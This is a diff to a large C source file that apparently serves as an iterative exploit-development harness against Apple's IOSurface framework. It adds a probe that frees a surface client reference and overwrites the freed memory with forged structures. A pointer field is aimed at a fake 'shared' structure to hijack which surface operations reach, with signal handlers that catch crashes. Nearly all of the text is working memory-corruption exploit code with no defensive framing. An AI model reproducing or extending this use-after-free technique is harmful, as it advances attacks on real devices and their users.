@@ -16141,6 +16141,273 @@ static void r393_probe(void) {
 }
 
 /*
+ * r400: Shared data structure reverse engineering.
+ *
+ * BREAKTHROUGH from r399: The +8 field in the IOSurface client ref is a
+ * PLAIN userspace pointer (NOT PAC-signed) that solely controls operation
+ * routing. It points to a surface-specific "shared" data structure.
+ *
+ * This probe:
+ *   Phase 1: Read and dump the shared data structure at +8
+ *   Phase 2: Compare shared data between surfaces to find per-surface fields
+ *   Phase 3: Create a FAKE shared data structure where we modify individual
+ *            fields, point +8 at it, test which fields in the shared data
+ *            control routing/behavior
+ *   Phase 4: If we can identify the io_connect_t or surface identifier,
+ *            test setting it to arbitrary values
+ */
+static volatile int g_r400_crashed = 0;
+static sigjmp_buf g_r400_jmp;
+static void r400_sighandler(int sig) {
+    g_r400_crashed = sig;
+    siglongjmp(g_r400_jmp, 1);
+}
+
+static void r400_probe(void) {
+    rlog("\n=== r400: Shared Data Structure Reverse Engineering ===\n\n");
+    fflush(stdout);
+
+    void (*clientRelease)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceClientRelease");
+    if (!clientRelease) { rlog("  Missing symbols\n"); return; }
+
+    struct sigaction sa400, old_bus400, old_segv400;
+    memset(&sa400, 0, sizeof(sa400));
+    sa400.sa_handler = r400_sighandler;
+    sa400.sa_flags = 0;
+    sigaction(SIGBUS, &sa400, &old_bus400);
+    sigaction(SIGSEGV, &sa400, &old_segv400);
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf_=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf_);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    /* ---- Phase 1: Dump shared data structures ---- */
+    rlog("  Phase 1: Shared data structure dump\n");
+
+    IOSurfaceRef surfA = IOSurfaceCreate(props);
+    IOSurfaceRef surfB = IOSurfaceCreate(props);
+    IOSurfaceRef surfC = IOSurfaceCreate(props);
+    uint32_t sidA = IOSurfaceGetID(surfA);
+    uint32_t sidB = IOSurfaceGetID(surfB);
+    uint32_t sidC = IOSurfaceGetID(surfC);
+
+    /* Read +8 from each surface */
+    uint64_t sharedA = *(uint64_t*)((uint8_t*)surfA + 8);
+    uint64_t sharedB = *(uint64_t*)((uint8_t*)surfB + 8);
+    uint64_t sharedC = *(uint64_t*)((uint8_t*)surfC + 8);
+    rlog("    surfA sid=%u shared=%p\n", sidA, (void*)sharedA);
+    rlog("    surfB sid=%u shared=%p\n", sidB, (void*)sharedB);
+    rlog("    surfC sid=%u shared=%p\n", sidC, (void*)sharedC);
+    rlog("    Delta A→B: %lld bytes\n", (long long)(sharedB - sharedA));
+    rlog("    Delta B→C: %lld bytes\n", (long long)(sharedC - sharedB));
+
+    /* Dump shared data for surfA (read up to 512 bytes) */
+    rlog("\n    surfA shared data dump (%p):\n", (void*)sharedA);
+    uint8_t *spA = (uint8_t*)sharedA;
+    uint8_t *spB = (uint8_t*)sharedB;
+
+    g_r400_crashed = 0;
+    if (sigsetjmp(g_r400_jmp, 1) == 0) {
+        for (int off = 0; off < 256; off += 8) {
+            uint64_t va = *(uint64_t*)(spA + off);
+            rlog("    +%3d: 0x%016llx", off, (unsigned long long)va);
+            /* Annotate pointer-like values */
+            if (va >= 0x100000000ULL && va < 0x200000000ULL) rlog("  <userspace ptr>");
+            else if ((va >> 48) == 0xffff) rlog("  <kernel ptr?>");
+            else if (va > 0 && va < 0x10000) rlog("  <small: %llu>", (unsigned long long)va);
+            else if (va == (uint64_t)sidA) rlog("  <== SURFACE ID A ==>");
+            else if (va == (uint64_t)sidB) rlog("  <surface ID B>");
+            /* Check for Mach port-like values (small positive integers) */
+            uint32_t lo = (uint32_t)va;
+            if (lo > 0x100 && lo < 0x10000 && (lo & 3) == 3) rlog("  <mach port?>");
+            rlog("\n");
+        }
+    } else {
+        rlog("    CRASHED reading shared data: signal %d\n", g_r400_crashed);
+    }
+    fflush(stdout);
+
+    /* ---- Phase 2: Compare shared data A vs B ---- */
+    rlog("\n  Phase 2: Shared data comparison (A vs B)\n");
+
+    int shared_diffs[64];
+    int nsdiffs = 0;
+
+    g_r400_crashed = 0;
+    if (sigsetjmp(g_r400_jmp, 1) == 0) {
+        for (int off = 0; off < 256; off += 8) {
+            uint64_t va = *(uint64_t*)(spA + off);
+            uint64_t vb = *(uint64_t*)(spB + off);
+            if (va != vb) {
+                rlog("    +%3d: A=0x%016llx B=0x%016llx", off,
+                    (unsigned long long)va, (unsigned long long)vb);
+                /* Check if either matches a surface ID */
+                uint32_t loA = (uint32_t)va, loB = (uint32_t)vb;
+                if (loA == sidA && loB == sidB) rlog("  <== SURFACE ID ==>");
+                else if (loA == sidA) rlog("  <A has sid>");
+                else if (loB == sidB) rlog("  <B has sid>");
+                int64_t delta = (int64_t)vb - (int64_t)va;
+                if (delta > 0 && delta < 100) rlog("  [delta=%lld]", (long long)delta);
+                rlog("\n");
+                if (nsdiffs < 64) shared_diffs[nsdiffs++] = off;
+            }
+        }
+        rlog("    Total differing fields in shared data: %d\n", nsdiffs);
+    } else {
+        rlog("    CRASHED comparing shared data: signal %d\n", g_r400_crashed);
+    }
+    fflush(stdout);
+
+    /* ---- Phase 3: Fake shared data with field-by-field routing ---- */
+    rlog("\n  Phase 3: Fake shared data routing test\n");
+
+    /* Copy surfA's shared data into a controlled buffer */
+    uint8_t fakeShared[512];
+    memcpy(fakeShared, spA, 256);
+    memset(fakeShared + 256, 0, 256);
+
+    /* Save surface data */
+    uint8_t dataA[512], dataB[512];
+    memcpy(dataA, (void*)surfA, 512);
+    memcpy(dataB, (void*)surfB, 512);
+
+    /* Free C for testing */
+    uintptr_t freedC = (uintptr_t)surfC;
+    clientRelease(surfC);
+
+    /* First test: point +8 to our fake shared data (copy of A's) → should route to A */
+    uint8_t testRef[512];
+    memcpy(testRef, dataA, 512);
+    *(uint64_t*)(testRef + 8) = (uint64_t)fakeShared;
+    memcpy((void*)freedC, testRef, 448);
+
+    g_r400_crashed = 0;
+    if (sigsetjmp(g_r400_jmp, 1) == 0) {
+        int v = 0xFA4E;
+        CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &v);
+        IOSurfaceSetValue(surfC, CFSTR("FakeTest"), nv);
+        CFRelease(nv);
+        CFTypeRef rv = IOSurfaceCopyValue(surfA, CFSTR("FakeTest"));
+        rlog("    Fake shared (A copy) → A has FakeTest? %s\n", rv ? "YES" : "no");
+        if (rv) { IOSurfaceRemoveValue(surfA, CFSTR("FakeTest")); CFRelease(rv); }
+    } else {
+        rlog("    CRASHED with fake shared data: signal %d\n", g_r400_crashed);
+    }
+    fflush(stdout);
+
+    /* Now test: change individual fields in the fake shared data to B's values */
+    rlog("\n    Per-field shared data routing test:\n");
+
+    for (int di = 0; di < nsdiffs && di < 32; di++) {
+        int off = shared_diffs[di];
+        /* Start from A's shared data, swap one field to B's value */
+        memcpy(fakeShared, spA, 256);
+        memcpy(fakeShared + off, spB + off, 8);
+
+        memcpy(testRef, dataA, 512);
+        *(uint64_t*)(testRef + 8) = (uint64_t)fakeShared;
+        memcpy((void*)freedC, testRef, 448);
+
+        g_r400_crashed = 0;
+        char routeResult = '?';
+        if (sigsetjmp(g_r400_jmp, 1) == 0) {
+            int v = 0xEE00 + di;
+            CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &v);
+            char key[32];
+            snprintf(key, sizeof(key), "ST_%d", di);
+            CFStringRef cfk = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+            IOSurfaceSetValue(surfC, cfk, nv);
+            CFRelease(nv);
+
+            CFTypeRef rvA = IOSurfaceCopyValue(surfA, cfk);
+            CFTypeRef rvB = IOSurfaceCopyValue(surfB, cfk);
+            if (rvA && !rvB) routeResult = 'A';
+            else if (!rvA && rvB) routeResult = 'B';
+            else if (rvA && rvB) routeResult = '!';
+            else routeResult = '-';
+            if (rvA) { IOSurfaceRemoveValue(surfA, cfk); CFRelease(rvA); }
+            if (rvB) { IOSurfaceRemoveValue(surfB, cfk); CFRelease(rvB); }
+            CFRelease(cfk);
+        } else {
+            routeResult = 'X';
+        }
+        rlog("    shared+%3d: swap B → route=%c", off, routeResult);
+        if (routeResult == 'B') rlog("  *** ROUTING FIELD IN SHARED DATA ***");
+        if (routeResult == 'X') rlog("  (crashed sig=%d)", g_r400_crashed);
+        if (routeResult == '-') rlog("  (lost — neither A nor B)");
+        rlog("\n");
+    }
+    fflush(stdout);
+
+    /* ---- Phase 4: Surface ID field test ---- */
+    rlog("\n  Phase 4: Surface ID value test\n");
+
+    /* If we found the routing field in shared data, test modifying its value */
+    /* For now, test if the surface ID in shared data controls routing */
+    for (int di = 0; di < nsdiffs; di++) {
+        int off = shared_diffs[di];
+        uint32_t loA = *(uint32_t*)(spA + off);
+        uint32_t loB = *(uint32_t*)(spB + off);
+        if (loA == sidA && loB == sidB) {
+            rlog("    Surface ID found at shared+%d!\n", off);
+            rlog("    Testing: set shared+%d to surfB's sid (%u)...\n", off, sidB);
+
+            memcpy(fakeShared, spA, 256);
+            *(uint32_t*)(fakeShared + off) = sidB;
+
+            memcpy(testRef, dataA, 512);
+            *(uint64_t*)(testRef + 8) = (uint64_t)fakeShared;
+            memcpy((void*)freedC, testRef, 448);
+
+            g_r400_crashed = 0;
+            if (sigsetjmp(g_r400_jmp, 1) == 0) {
+                int v = 0x1D1D;
+                CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &v);
+                IOSurfaceSetValue(surfC, CFSTR("SidSwap"), nv);
+                CFRelease(nv);
+                CFTypeRef rvA = IOSurfaceCopyValue(surfA, CFSTR("SidSwap"));
+                CFTypeRef rvB = IOSurfaceCopyValue(surfB, CFSTR("SidSwap"));
+                rlog("    SidSwap: A=%s B=%s\n",
+                    rvA ? "YES" : "no", rvB ? "YES" : "no");
+                if (rvA) { IOSurfaceRemoveValue(surfA, CFSTR("SidSwap")); CFRelease(rvA); }
+                if (rvB) { IOSurfaceRemoveValue(surfB, CFSTR("SidSwap")); CFRelease(rvB); }
+
+                if (rvB) {
+                    rlog("    *** SURFACE ID ALONE CONTROLS ROUTING ***\n");
+                    rlog("    We can redirect to ANY surface by setting its ID!\n");
+                }
+            } else {
+                rlog("    CRASHED: signal %d\n", g_r400_crashed);
+            }
+            break;
+        }
+    }
+    fflush(stdout);
+
+    /* Cleanup */
+    sigaction(SIGBUS, &old_bus400, NULL);
+    sigaction(SIGSEGV, &old_segv400, NULL);
+    CFRelease(surfA);
+    CFRelease(surfB);
+    CFRelease(props);
+
+    rlog("\n=== r400 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r399: Client ref field analysis.
  *
  * Key observation: SetValue/Lock/RemoveValue work through the redirect, but
@@ -63722,6 +63989,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 403) {
+            rlog("*** rounds=403: Shared Data Structure Reverse Engineering ***\n");
+            rlog("  Dump +8 target, compare per-surface fields, fake shared data routing.\n\n");
+            fflush(stdout);
+            r400_probe();
+            goto done;
+        }
         if (rounds == 402) {
             rlog("*** rounds=402: Client Ref Field Analysis ***\n");
             rlog("  Structure comparison, field-by-field routing test, routing field ID.\n\n");
@@ -66128,7 +66402,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
